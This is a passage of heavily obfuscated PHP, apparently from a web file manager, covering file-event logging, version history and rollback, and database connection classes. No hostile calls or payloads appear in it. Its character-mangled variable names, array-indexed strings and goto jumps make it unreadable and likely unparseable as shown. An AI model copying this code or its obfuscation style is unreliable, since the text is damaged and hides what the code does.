=> $ıºùÕ×¤, $¾è¶­å[2215] => $ÜÍ½½[$¾è¶­å[192]], $¾è¶­å[2216] => $ÜÍ½½[$¾è¶­å[32]], $¾è¶­å[586] => !empty($ÜÍ½½[$¾è¶­å[586]]) ? $ÜÍ½½[$¾è¶­å[586]] : $¾è¶­å[12], $¾è¶­å[1774] => $Õ·±ª¹½, $¾è¶­å[498] => $ÖøÍ¡»¦, $¾è¶­å[1776] => $ˆ¡Âš™…); $this->addSystemLog($ÖøÍ¡»¦, $¦ğå); unset($¦ğå[$¾è¶­å[2216]], $¦ğå[$¾è¶­å[586]]); return $this->add($¦ğå); } private function addSystemLog($Œô´¸õ, $·İò‘¸¯) { $¦ŠĞğñÇ =& $_SERVER[†ûãı«°]; if ($Œô´¸õ == $¦ŠĞğñÇ[2217]) { $Œô´¸õ = $·İò‘¸¯[$¦ŠĞğñÇ[528]][$¦ŠĞğñÇ[2218]]; } else { if (in_array($Œô´¸õ, array($¦ŠĞğñÇ[1963], $¦ŠĞğñÇ[2219]))) { $Œô´¸õ = $·İò‘¸¯[$¦ŠĞğñÇ[528]][$¦ŠĞğñÇ[171]]; } } $üÊí™æ› = array_merge($·İò‘¸¯, array($¦ŠĞğñÇ[2220] => $·İò‘¸¯[$¦ŠĞğñÇ[193]], $¦ŠĞğñÇ[2221] => $·İò‘¸¯[$¦ŠĞğñÇ[2221]])); Hook::trigger($¦ŠĞğñÇ[2222], $¦ŠĞğñÇ[2223] . $Œô´¸õ, $·İò‘¸¯); Model($¦ŠĞğñÇ[1927])->addLog($¦ŠĞğñÇ[2223] . $Œô´¸õ, $üÊí™æ›); } private function isDisableEvent($Íï¡õß¥, $Ìê… ¤ğ) { $ıÌÚÑ’³ =& $_SERVER[†ûãı«°]; if ($Íï¡õß¥[$ıÌÚÑ’³[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ìê… ¤ğ == $ıÌÚÑ’³[1952]) { return !1; } return !0; } public function eventCreate($éé¯Œ«Ş, $‰´öÔ) { $ßÃ™¤Ÿì =& $_SERVER[†ûãı«°]; $»€‰ç¿Ç = Model($ßÃ™¤Ÿì[1432])->sourceInfo($éé¯Œ«Ş); $–¹Öøô— = array($ßÃ™¤Ÿì[2218] => $‰´öÔ, $ßÃ™¤Ÿì[32] => $»€‰ç¿Ç[$ßÃ™¤Ÿì[32]]); return $this->addEvent($éé¯Œ«Ş, $ßÃ™¤Ÿì[2217], $–¹Öøô—); } public function eventFileEdit($»ì¾™Û») { $¢Áã³ûÄ =& $_SERVER[†ûãı«°]; $úßÇÀ¹ö = array($¢Áã³ûÄ[2224] => $_SERVER[$¢Áã³ûÄ[2225]], $¢Áã³ûÄ[2226] => strtolower(ACTION)); if (isset($GLOBALS[$¢Áã³ûÄ[7]][$¢Áã³ûÄ[2227]])) { $úßÇÀ¹ö[$¢Áã³ûÄ[2227]] = $¢Áã³ûÄ[91]; } return $this->addEvent($»ì¾™Û», $¢Áã³ûÄ[1953], $úßÇÀ¹ö); } public function eventRecycle($ı×‹‰‘«, $ìàİìı¨) { return $this->addEvent($ı×‹‰‘«, $_SERVER[†ûãı«°][2219], $ìàİìı¨); } private static $_removeLast = ''; public function eventRemove($€â··˜) { $½—üü‡ƒ =& $_SERVER[†ûãı«°]; self::$_removeLast = $€â··˜; $¹Ğµ«ùÍ = Model($½—üü‡ƒ[1432])->sourceInfo($€â··˜); $…Ö­ããÓ = array_field_key($¹Ğµ«ùÍ, array($½—üü‡ƒ[193], $½—üü‡ƒ[545], $½—üü‡ƒ[507], $½—üü‡ƒ[588])); $æÁø·Âæ = array($½—üü‡ƒ[171] => $¹Ğµ«ùÍ[$½—üü‡ƒ[32]], $½—üü‡ƒ[2226] => ACTION, $½—üü‡ƒ[2228] => $…Ö­ããÓ); return $this->addEvent($¹Ğµ«ùÍ[$½—üü‡ƒ[192]], $½—üü‡ƒ[1952], $æÁø·Âæ); } public function eventShare($¾ÑÀ†ê, $¥Ñ¨°ÉÎ) { return $this->addEvent($¾ÑÀ†ê, $_SERVER[†ûãı«°][1963], $¥Ñ¨°ÉÎ); } public function eventMove($âÎ³—„, $ÂæŸø—ø, $ÒÜ‡Š˜Œ) { $Â›üéé =& $_SERVER[†ûãı«°]; if (self::$_removeLast == $âÎ³—„) { return; } $²”åƒÍç = Model($Â›üéé[1432]); $„í­¶Â§ = $²”åƒÍç->sourceInfo($âÎ³—„); $ÃŒ›³÷Â = $²”åƒÍç->sourceInfo($ÂæŸø—ø); $†şš¢®± = $²”åƒÍç->sourceInfo($ÒÜ‡Š˜Œ); $áúÙñ¾ = array($Â›üéé[1252] => $ÂæŸø—ø, $Â›üéé[2229] => $ÃŒ›³÷Â[$Â›üéé[32]], $Â›üéé[2205] => !empty($ÃŒ›³÷Â[$Â›üéé[586]]) ? $ÃŒ›³÷Â[$Â›üéé[586]] : $Â›üéé[12], $Â›üéé[1253] => $ÒÜ‡Š˜Œ, $Â›üéé[2230] => $†şš¢®±[$Â›üéé[32]], $Â›üéé[2231] => !empty($†şš¢®±[$Â›üéé[586]]) ? $†şš¢®±[$Â›üéé[586]] : $Â›üéé[12]); $this->addEvent($âÎ³—„, $Â›üéé[627], $áúÙñ¾); $„í­¶Â§ = $²”åƒÍç->sourceInfo($âÎ³—„); $áúÙñ¾ = array($Â›üéé[193] => $„í­¶Â§[$Â›üéé[193]], $Â›üéé[32] => $„í­¶Â§[$Â›üéé[32]]); $this->addEvent($ÂæŸø—ø, $Â›üéé[2232], $áúÙñ¾); } public function eventCopy($éñ·ãİ) { $this->eventCreate($éñ·ãİ, $_SERVER[†ûãı«°][625]); } public function eventRename($©«ˆ„·”, $¼‘•÷Ñ¯, $Áöé¨) { $Ó®îŸŞ‹ =& $_SERVER[†ûãı«°]; $§œ•ˆû³ = array($Ó®îŸŞ‹[1252] => $¼‘•÷Ñ¯, $Ó®îŸŞ‹[1253] => $Áöé¨); return $this->addEvent($©«ˆ„·”, $Ó®îŸŞ‹[1446], $§œ•ˆû³); } public function eventAddComment($‚Ò£âé, $ò×ë…ÏŞ) { return $this->addEvent($‚Ò£âé, $_SERVER[†ûãı«°][2233], $ò×ë…ÏŞ); } public function eventAddDesc($ÌÛúâŠã, $¹ø†å  ) { return $this->addEvent($ÌÛúâŠã, $_SERVER[†ûãı«°][2234], $¹ø†å  ); } public function listBySource($Òç°õ”) { $ë²àè‹ë =& $_SERVER[†ûãı«°]; $·á€Êïî = Model($ë²àè‹ë[1432])->sourceInfo($Òç°õ”); $ĞæŞé³Ö = array($ë²àè‹ë[493] => $Òç°õ”); if ($·á€Êïî[$ë²àè‹ë[487]] == $ë²àè‹ë[91]) { $à½ş­š = Model($ë²àè‹ë[1432])->listSearchChildren($Òç°õ”, 20000); $à½ş­š[] = $Òç°õ” . $ë²àè‹ë[456]; $ĞæŞé³Ö = array($ë²àè‹ë[193] => array($ë²àè‹ë[7], $à½ş­š)); } $½ØÁéêŞ = $this->where($ĞæŞé³Ö)->order($ë²àè‹ë[2235])->selectPage(); if ($½ØÁéêŞ[$ë²àè‹ë[444]][$ë²àè‹ë[445]] == 0) { $½ØÁéêŞ[$ë²àè‹ë[444]][$ë²àè‹ë[445]] = 1; $½ØÁéêŞ[$ë²àè‹ë[447]] = array(array($ë²àè‹ë[493] => $Òç°õ”, $ë²àè‹ë[2215] => $·á€Êïî[$ë²àè‹ë[192]], $ë²àè‹ë[1774] => $·á€Êïî[$ë²àè‹ë[529]], $ë²àè‹ë[498] => $ë²àè‹ë[2236], $ë²àè‹ë[499] => $·á€Êïî[$ë²àè‹ë[233]], $ë²àè‹ë[1776] => $ë²àè‹ë[12])); } return $this->eventListParse($½ØÁéêŞ, $Òç°õ”); } private function eventListParse($¶¸«æÆ¸, $—Ê´áÖ) { $±ß¤Ø„ =& $_SERVER[†ûãı«°]; $µáĞ©í¿ = $¶¸«æÆ¸[$±ß¤Ø„[447]]; $ôæë‡ÕÅ = array_to_keyvalue($µáĞ©í¿, $±ß¤Ø„[12], $±ß¤Ø„[193]); $Ù¶ÏÊ×Ò = array_to_keyvalue($µáĞ©í¿, $±ß¤Ø„[12], $±ß¤Ø„[2221]); foreach ($µáĞ©í¿ as $–—ËØâı) { $½¯ı‘¨ = $–—ËØâı[$±ß¤Ø„[528]]; if ($–—ËØâı[$±ß¤Ø„[33]] == $±ß¤Ø„[627] && isset($½¯ı‘¨[$±ß¤Ø„[1252]])) { $ôæë‡ÕÅ[] = $½¯ı‘¨[$±ß¤Ø„[1252]] . $±ß¤Ø„[12]; $ôæë‡ÕÅ[] = $½¯ı‘¨[$±ß¤Ø„[1253]] . $±ß¤Ø„[12]; } if ($–—ËØâı[$±ß¤Ø„[33]] == $±ß¤Ø„[2232] && isset($½¯ı‘¨[$±ß¤Ø„[193]])) { $ôæë‡ÕÅ[] = $½¯ı‘¨[$±ß¤Ø„[193]] . $±ß¤Ø„[12]; } } $ôæë‡ÕÅ = array_merge($ôæë‡ÕÅ, $Ù¶ÏÊ×Ò, array($—Ê´áÖ . $±ß¤Ø„[12])); $ôæë‡ÕÅ = array_unique($ôæë‡ÕÅ); $Äìî = array_unique(array_to_keyvalue($µáĞ©í¿, $±ß¤Ø„[12], $±ß¤Ø„[1783])); $ ³ØÌéë = Model($±ß¤Ø„[601])->userListInfo($Äìî); $ÂÅñš = Model($±ß¤Ø„[906])->sourceListInfo($ôæë‡ÕÅ, !0); foreach ($µáĞ©í¿ as &$–—ËØâı) { if ($–—ËØâı[$±ß¤Ø„[33]] == $±ß¤Ø„[627] && isset($–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[1252]])) { $–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[1252]] = $ÂÅñš[$–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[1252]]]; $–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[1253]] = $ÂÅñš[$–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[1253]]]; } if ($–—ËØâı[$±ß¤Ø„[33]] == $±ß¤Ø„[2232] && isset($–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[193]])) { $–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[193]] = $ÂÅñš[$–—ËØâı[$±ß¤Ø„[528]][$±ß¤Ø„[193]]]; } $–—ËØâı[$±ß¤Ø„[90]] = $ÂÅñš[$–—ËØâı[$±ß¤Ø„[193]]]; $–—ËØâı[$±ß¤Ø„[2237]] = $ÂÅñš[$–—ËØâı[$±ß¤Ø„[2221]]]; if ($–—ËØâı[$±ß¤Ø„[33]] == $±ß¤Ø„[1952]) { $–—ËØâı[$±ß¤Ø„[2237]] = $–—ËØâı[$±ß¤Ø„[90]]; $–—ËØâı[$±ß¤Ø„[2221]] = $–—ËØâı[$±ß¤Ø„[2237]][$±ß¤Ø„[193]]; $–—ËØâı[$±ß¤Ø„[90]] = !1; $–—ËØâı[$±ß¤Ø„[193]] = $±ß¤Ø„[12]; } $–—ËØâı[$±ß¤Ø„[2164]] = $ ³ØÌéë[$–—ËØâı[$±ß¤Ø„[1783]]]; } unset($–—ËØâı); $¶¸«æÆ¸[$±ß¤Ø„[447]] = $µáĞ©í¿; return $¶¸«æÆ¸; } public function removeBySource($ûüÛ¦åĞ) { $¬©‹„ŒÂ = array($_SERVER[†ûãı«°][493] => $ûüÛ¦åĞ); $this->where($¬©‹„ŒÂ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\143\145\137\150\x69\x73\164\x6f\x72\171"; public function historyCount($Ä¡±Öº’) { $³÷”ÒÂ =& $_SERVER[†ûãı«°]; if (!$Ä¡±Öº’) { return array(); } if (is_string($Ä¡±Öº’) || is_int($Ä¡±Öº’)) { $Ä¡±Öº’ = array($Ä¡±Öº’); } $Ó±÷ƒ‚  = array($³÷”ÒÂ[193], $³÷”ÒÂ[2238] => $³÷”ÒÂ[569]); $ÆÒ÷Ñöö = array($³÷”ÒÂ[193] => array($³÷”ÒÂ[7], $Ä¡±Öº’)); $çœˆ³ô€ = $this->field($Ó±÷ƒ‚ )->where($ÆÒ÷Ñöö)->group($³÷”ÒÂ[193])->select(); return array_to_keyvalue($çœˆ³ô€, $³÷”ÒÂ[193], $³÷”ÒÂ[569]); } public function addHistory($œ“ÜÀöÖ, $ªÁä˜©û = '') { $¶ş”™ =& $_SERVER[†ûãı«°]; $êûüš²Ñ = array($¶ş”™[493] => $œ“ÜÀöÖ[$¶ş”™[193]], $¶ş”™[1774] => isset($œ“ÜÀöÖ[$¶ş”™[531]]) ? $œ“ÜÀöÖ[$¶ş”™[531]] : $œ“ÜÀöÖ[$¶ş”™[529]], $¶ş”™[546] => $œ“ÜÀöÖ[$¶ş”™[545]], $¶ş”™[624] => $œ“ÜÀöÖ[$¶ş”™[79]], $¶ş”™[2239] => $ªÁä˜©û); if ($GLOBALS[$¶ş”™[6]][$¶ş”™[92]][$¶ş”™[1313]] >= 1) { $this->historyAutoClear($êûüš²Ñ[$¶ş”™[193]]); $this->add($êûüš²Ñ); } Hook::trigger($¶ş”™[2240], $êûüš²Ñ); Model($¶ş”™[2241])->eventFileEdit($œ“ÜÀöÖ[$¶ş”™[193]]); } private function historyAutoClear($“«‡ä«) { $¹¤ÑÔŒ =& $_SERVER[†ûãı«°]; $Ñ”Ö–†¡ = Model($¹¤ÑÔŒ[846])->get($¹¤ÑÔŒ[1335]); $ó®¿ÒÁ = intval($GLOBALS[$¹¤ÑÔŒ[6]][$¹¤ÑÔŒ[92]][$¹¤ÑÔŒ[1313]]); $‹šø‘®† = $Ñ”Ö–†¡ == $¹¤ÑÔŒ[1336] ? min(5, $ó®¿ÒÁ) : $ó®¿ÒÁ; $‹šø‘®† = $‹šø‘®† <= 0 ? 0 : $‹šø‘®† - 1; if ($‹šø‘®† >= 499) { return; } $¦°»Ñâ£ = array($¹¤ÑÔŒ[493] => $“«‡ä«); $ÎëãÑÃÆ = $this->field($¹¤ÑÔŒ[2242])->where($¦°»Ñâ£)->order($¹¤ÑÔŒ[2235])->select(); if (!$ÎëãÑÃÆ || $‹šø‘®† >= count($ÎëãÑÃÆ)) { return; } $˜ÔÙÂÄ¤ = array_to_keyvalue($ÎëãÑÃÆ, $¹¤ÑÔŒ[12], $¹¤ÑÔŒ[477]); $˜ÔÙÂÄ¤ = array_slice($˜ÔÙÂÄ¤, $‹šø‘®†); $•Ä‡÷ç˜ = array_to_keyvalue($ÎëãÑÃÆ, $¹¤ÑÔŒ[12], $¹¤ÑÔŒ[545]); $•Ä‡÷ç˜ = array_slice($•Ä‡÷ç˜, $‹šø‘®†); if (!$˜ÔÙÂÄ¤ || !$•Ä‡÷ç˜) { return; } $¦°»Ñâ£ = array($¹¤ÑÔŒ[495] => array($¹¤ÑÔŒ[7], $˜ÔÙÂÄ¤)); $this->where($¦°»Ñâ£)->delete(); Model($¹¤ÑÔŒ[548])->remove($•Ä‡÷ç˜); } public function listData($‡¿áÑ‰ö) { $ƒÍ¶Ê¤è =& $_SERVER[†ûãı«°]; $œİ—ó¤ê = array($ƒÍ¶Ê¤è[493] => $‡¿áÑ‰ö); $Ÿõ¢ƒí = $ƒÍ¶Ê¤è[2243]; $Éœ„æğ¦ = $this->field($Ÿõ¢ƒí)->where($œİ—ó¤ê)->order($ƒÍ¶Ê¤è[2235])->selectPage(); $this->_listAppendUser($Éœ„æğ¦[$ƒÍ¶Ê¤è[447]]); $¾„ÏÊÎ‚ = Model($ƒÍ¶Ê¤è[846])->get($ƒÍ¶Ê¤è[1335]); $ø Ã™‰ = 5; if ($¾„ÏÊÎ‚ == $ƒÍ¶Ê¤è[1336]) { $Éœ„æğ¦[$ƒÍ¶Ê¤è[447]] = array_slice($Éœ„æğ¦[$ƒÍ¶Ê¤è[447]], 0, $ø Ã™‰); $Éœ„æğ¦[$ƒÍ¶Ê¤è[444]] = array($ƒÍ¶Ê¤è[2244] => 1, $ƒÍ¶Ê¤è[2245] => 20, $ƒÍ¶Ê¤è[2246] => 1, $ƒÍ¶Ê¤è[2247] => count($Éœ„æğ¦[$ƒÍ¶Ê¤è[447]])); } return $Éœ„æğ¦; } protected function _listAppendUser(&$á•··¸) { $û¯÷æü =& $_SERVER[†ûãı«°]; $˜Ò˜ˆêî = array_to_keyvalue($á•··¸, $û¯÷æü[12], $û¯÷æü[1783]); $…éËğÎ = Model($û¯÷æü[601])->userListInfo($˜Ò˜ˆêî); foreach ($á•··¸ as &$¦“ëÒ¥¦) { $™¿á¦Å = $¦“ëÒ¥¦[$û¯÷æü[1783]]; $¦“ëÒ¥¦[$û¯÷æü[529]] = $…éËğÎ[$™¿á¦Å] ? $…éËğÎ[$™¿á¦Å] : !1; } unset($¦“ëÒ¥¦); } public function fileInfo($òƒ‹Ùô) { $”‹ÑÒ‡Õ =& $_SERVER[†ûãı«°]; $õèÌ…„¤ = $this->tablePrefix; $Šçß¸î÷ = "{$õèÌ…„¤}\x69\x6f\137\146\x69\x6c\145\x20\146\151\x6c\145\163\x20\x6f\156\x20\x66\151\154\x65\x73\56\146\151\x6c\145\111\104\40\x3d\x20\150\x69\163\164\x6f\x72\171\x2e\146\151\154\x65\x49\x44"; return $this->alias($”‹ÑÒ‡Õ[2248])->where(array($”‹ÑÒ‡Õ[495] => $òƒ‹Ùô))->join($Šçß¸î÷, $”‹ÑÒ‡Õ[2249])->find(); } public function removeItem($Æôªö‰À) { $˜ÌÖØáÕ =& $_SERVER[†ûãı«°]; $äæÀ‰ÈÛ = array($˜ÌÖØáÕ[495] => $Æôªö‰À); $Ÿ·£Äã = $this->where($äæÀ‰ÈÛ)->find(); if ($Ÿ·£Äã) { $ğ½ö•İè = $this->where($äæÀ‰ÈÛ)->delete(); Model($˜ÌÖØáÕ[548])->remove($Ÿ·£Äã[$˜ÌÖØáÕ[545]]); return $ğ½ö•İè; } return !1; } public function removeBySource($¸·ÆœÇ) { $ß«±¶² =& $_SERVER[†ûãı«°]; if (!$¸·ÆœÇ) { return !1; } if (!is_array($¸·ÆœÇ)) { $¸·ÆœÇ = array($¸·ÆœÇ); } $·­ùÅï = array($ß«±¶²[493] => array($ß«±¶²[7], $¸·ÆœÇ)); $ÑûïÃçá = $this->field($ß«±¶²[546])->where($·­ùÅï)->select(); if ($ÑûïÃçá) { $this->where($·­ùÅï)->delete(); $ôßôäğ = array_to_keyvalue($ÑûïÃçá, $ß«±¶²[12], $ß«±¶²[545]); Model($ß«±¶²[548])->remove($ôßôäğ); } return !0; } public function setDetail($Ò¸ØÇÜ€, $ÊäşØ¢©) { $®À™”Ø =& $_SERVER[†ûãı«°]; return $this->where(array($®À™”Ø[495] => $Ò¸ØÇÜ€))->save(array($®À™”Ø[2239] => $ÊäşØ¢©)); } public function rollbackToItem($©ÓÁâïó, $¸€ƒüŠ) { $ÚÎíøşš =& $_SERVER[†ûãı«°]; $öœ»®‡ı = Model($ÚÎíøşš[906])->sourceInfo($©ÓÁâïó); $this->addHistory($öœ»®‡ı, LNG($ÚÎíøşš[2250])); $°ì–Ô‰Í = $this->find($¸€ƒüŠ); $§øóáòÏ = array($ÚÎíøşš[545] => $°ì–Ô‰Í[$ÚÎíøşš[545]], $ÚÎíøşš[79] => $°ì–Ô‰Í[$ÚÎíøşš[79]], $ÚÎíøşš[88] => time(), $ÚÎíøşš[531] => USER_ID); Model($ÚÎíøşš[906])->where(array($ÚÎíøşš[193] => $©ÓÁâïó))->save($§øóáòÏ); return $this->where(array($ÚÎíøşš[495] => $¸€ƒüŠ))->delete(); } public function clearSame($ÉÈØ˜Œ¾) { $Ëè¥ƒñ» =& $_SERVER[†ûãı«°]; $®ÉªàÖ¤ = $this->listData($ÉÈØ˜Œ¾); $¦‹ú¬¼± = array_to_keyvalue_group($®ÉªàÖ¤, $Ëè¥ƒñ»[545]); $Ê«ú½•Ø = array(); $ÍèñÔÁ = array(); foreach ($¦‹ú¬¼± as $Âûòğğ) { if (!$Âûòğğ || count($Âûòğğ) <= 1) { continue; } foreach ($Âûòğğ as $çì—) { $Ê«ú½•Ø[] = $çì—[$Ëè¥ƒñ»[545]]; $ÍèñÔÁ[] = $çì—[$Ëè¥ƒñ»[477]]; } } if (!$ÍèñÔÁ) { return; } $this->where(array($Ëè¥ƒñ»[477] => array($Ëè¥ƒñ»[7], $ÍèñÔÁ)))->delete(); Model($Ëè¥ƒñ»[548])->remove($Ê«ú½•Ø); } public function userSpace() { $©½äÊĞ– =& $_SERVER[†ûãı«°]; $•„¾ˆŠ² = $this->tablePrefix; $ºØÀí×à = array($©½äÊĞ–[1774] => USER_ID); $¤ÚÏ¬İÉ = "{$•„¾ˆŠ²}\x69\157\137\146\151\x6c\145\x20\146\151\x6c\x65\163\x20\157\156\40\146\151\154\x65\x73\56\146\151\154\x65\111\x44\40\75\x20\150\151\163\x74\157\x72\x79\56\x66\151\x6c\x65\111\104"; return $this->alias($©½äÊĞ–[2248])->where($ºØÀí×à)->join($¤ÚÏ¬İÉ, $©½äÊĞ–[2249])->sum($©½äÊĞ–[79]); } } goto fõœœÑ“ò; c¡¼ÕâÛó÷: class DbSqlite3 extends DbSqlite3Base { public function query($çŸ˜äÙ) { $ ŒŒä· =& $_SERVER[†ûãı«°]; if (!CacheLock::fileLock($ ŒŒä·[13])) { return !1; } $”Àà®Ã€ = parent::query($çŸ˜äÙ); CacheLock::fileUnLock($ ŒŒä·[13]); return $”Àà®Ã€; } public function execute($»•¬¿‘İ) { $»ÏµÅ˜ò =& $_SERVER[†ûãı«°]; if (!CacheLock::fileLock($»ÏµÅ˜ò[13])) { return !1; } $¥àÃáš = parent::execute($»•¬¿‘İ); CacheLock::fileUnLock($»ÏµÅ˜ò[13]); return $¥àÃáš; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\x3c\76", "\147\x74" => "\76", "\x65\x67\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\145\x6c\164" => "\74\75", "\156\157\x74\154\x69\x6b\145" => "\116\117\124\40\114\x49\x4b\x45", "\154\x69\x6b\x65" => "\114\111\x4b\105", "\x69\x6e" => "\111\116", "\156\x6f\x74\151\x6e" => "\116\x4f\124\40\111\x4e", "\156\x6f\x74\40\151\x6e" => "\x4e\117\x54\40\111\x4e", "\x62\145\x74\x77\x65\x65\156" => "\102\x45\x54\x57\x45\105\x4e", "\x6e\x6f\x74\142\145\x74\167\x65\145\x6e" => "\116\117\x54\x20\102\105\x54\127\105\x45\x4e", "\x6e\157\x74\40\142\x65\164\x77\x65\145\x6e" => "\x4e\117\124\40\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\105\114\105\x43\124\x25\x44\111\x53\124\x49\x4e\103\x54\45\x20\45\106\111\105\114\x44\x25\40\x46\122\x4f\x4d\40\45\124\x41\x42\x4c\x45\x25\45\x4a\117\x49\116\x25\45\x57\x48\105\x52\x45\45\45\x47\x52\117\125\120\45\45\110\x41\126\111\x4e\x47\45\x25\x4f\x52\x44\x45\x52\45\x25\114\x49\115\x49\x54\45\x20\x25\125\x4e\x49\117\116\45\45\103\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $Ü—ìŸš£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[†ûãı«°][1048], $Ü—ìŸš£); } public function factory($Ü›³”’Å = '') { $§‹æ¬ =& $_SERVER[†ûãı«°]; $Ü›³”’Å = $this->parseConfig($Ü›³”’Å); if (empty($Ü›³”’Å[$§‹æ¬[1049]])) { think_exception(think_lang($§‹æ¬[1050])); } $this->dbType = ucwords(strtolower($Ü›³”’Å[$§‹æ¬[1049]])); $®°Çñ¶¢ = $§‹æ¬[1051] . $this->dbType; if (class_exists($®°Çñ¶¢)) { $µ¸„İŞ = new $®°Çñ¶¢($Ü›³”’Å); if ($§‹æ¬[1052] != strtolower($Ü›³”’Å[$§‹æ¬[1049]])) { $µ¸„İŞ->dbType = strtoupper($this->dbType); } else { $µ¸„İŞ->dbType = $this->_getDsnType($Ü›³”’Å[$§‹æ¬[1004]]); } } else { think_exception(think_lang($§‹æ¬[1053]) . $§‹æ¬[1054] . $®°Çñ¶¢); } return $µ¸„İŞ; } public function __call($…å­Úì, $Æíß‰¿ñ) { if (method_exists($this, $…å­Úì)) { return call_user_func_array(array($this, $…å­Úì), $Æíß‰¿ñ); } } protected function _getDsnType($«–ÈŞúÕ) { $ëÁß‚Ö = explode($_SERVER[†ûãı«°][4], $«–ÈŞúÕ); $¹“ïöÉ™ = strtoupper(trim($ëÁß‚Ö[0])); return $¹“ïöÉ™; } private function parseConfig($Ò×öÕ€É = '') { $ñ¸ĞçÂ¡ =& $_SERVER[†ûãı«°]; if (!empty($Ò×öÕ€É) && is_string($Ò×öÕ€É)) { $Ò×öÕ€É = $this->parseDSN($Ò×öÕ€É); } elseif (is_array($Ò×öÕ€É)) { $Ò×öÕ€É = array_change_key_case($Ò×öÕ€É); $Ò×öÕ€É = array($ñ¸ĞçÂ¡[1049] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1055]], $ñ¸ĞçÂ¡[976] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1056]], $ñ¸ĞçÂ¡[977] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1057]], $ñ¸ĞçÂ¡[974] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1058]], $ñ¸ĞçÂ¡[975] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1059]], $ñ¸ĞçÂ¡[21] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1060]], $ñ¸ĞçÂ¡[1004] => $Ò×öÕ€É[$ñ¸ĞçÂ¡[1061]], $ñ¸ĞçÂ¡[17] => isset($Ò×öÕ€É[$ñ¸ĞçÂ¡[1062]]) ? $Ò×öÕ€É[$ñ¸ĞçÂ¡[1062]] : array()); } elseif (empty($Ò×öÕ€É)) { if (think_config($ñ¸ĞçÂ¡[1063]) && $ñ¸ĞçÂ¡[1052] != strtolower(think_config($ñ¸ĞçÂ¡[1064]))) { $Ò×öÕ€É = $this->parseDSN(think_config($ñ¸ĞçÂ¡[1063])); } else { $Ò×öÕ€É = array($ñ¸ĞçÂ¡[1049] => think_config($ñ¸ĞçÂ¡[1064]), $ñ¸ĞçÂ¡[976] => think_config($ñ¸ĞçÂ¡[1065]), $ñ¸ĞçÂ¡[977] => think_config($ñ¸ĞçÂ¡[1066]), $ñ¸ĞçÂ¡[974] => think_config($ñ¸ĞçÂ¡[1067]), $ñ¸ĞçÂ¡[975] => think_config($ñ¸ĞçÂ¡[1068]), $ñ¸ĞçÂ¡[21] => think_config($ñ¸ĞçÂ¡[325]), $ñ¸ĞçÂ¡[1004] => think_config($ñ¸ĞçÂ¡[1063]), $ñ¸ĞçÂ¡[17] => think_config($ñ¸ĞçÂ¡[1069])); } } return $Ò×öÕ€É; } protected function initConnect($àì¡©ô = true) { if (1 == think_config($_SERVER[†ûãı«°][22])) { $this->_linkID = $this->multiConnect($àì¡©ô); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $šïıÏ¬Ù => $úºÕÌ¡å) { $this->_linkID = $úºÕÌ¡å; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($»ì Ì“¥ = false) { $¯¡ÃóÊ =& $_SERVER[†ûãı«°]; static $³€ÏÛÄù = array(); static $¿şÛ‚Ğ‡ = -1; if (empty($³€ÏÛÄù)) { foreach ($this->config as $î¤îƒŸã => $ÜàÊ•¸…) { $³€ÏÛÄù[$î¤îƒŸã] = explode($¯¡ÃóÊ[50], $ÜàÊ•¸…); } } if (think_config($¯¡ÃóÊ[1070])) { if ($»ì Ì“¥ || think_config($¯¡ÃóÊ[473]) === !0) { $è§Ô£÷Ä = floor(mt_rand(0, think_config($¯¡ÃóÊ[1071]) - 1)); $¿şÛ‚Ğ‡ = $è§Ô£÷Ä; } else { if (is_numeric(think_config($¯¡ÃóÊ[1072]))) { $è§Ô£÷Ä = think_config($¯¡ÃóÊ[1072]); } else { $è§Ô£÷Ä = floor(mt_rand(think_config($¯¡ÃóÊ[1071]), count($³€ÏÛÄù[$¯¡ÃóÊ[974]]) - 1)); } } } else { $è§Ô£÷Ä = floor(mt_rand(0, count($³€ÏÛÄù[$¯¡ÃóÊ[974]]) - 1)); $¿şÛ‚Ğ‡ = $è§Ô£÷Ä; } $è§Ô£÷Ä = $¿şÛ‚Ğ‡ !== -1 ? $¿şÛ‚Ğ‡ : $è§Ô£÷Ä; $¸¨ñÓ®± = array($¯¡ÃóÊ[976] => isset($³€ÏÛÄù[$¯¡ÃóÊ[976]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[976]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[976]][0], $¯¡ÃóÊ[977] => isset($³€ÏÛÄù[$¯¡ÃóÊ[977]][$è§Ô£÷Ä]) ? $³€ÏÛÄù[$¯¡ÃóÊ[977]][$è§Ô£÷Ä] : $³€ÏÛÄù[$¯¡ÃóÊ[977]][0], $¯¡ÃóÊ[974] => isset($³€ÏÛÄù[$¯¡ÃóÊ[974]][$è§Ô£÷Ä]) ? 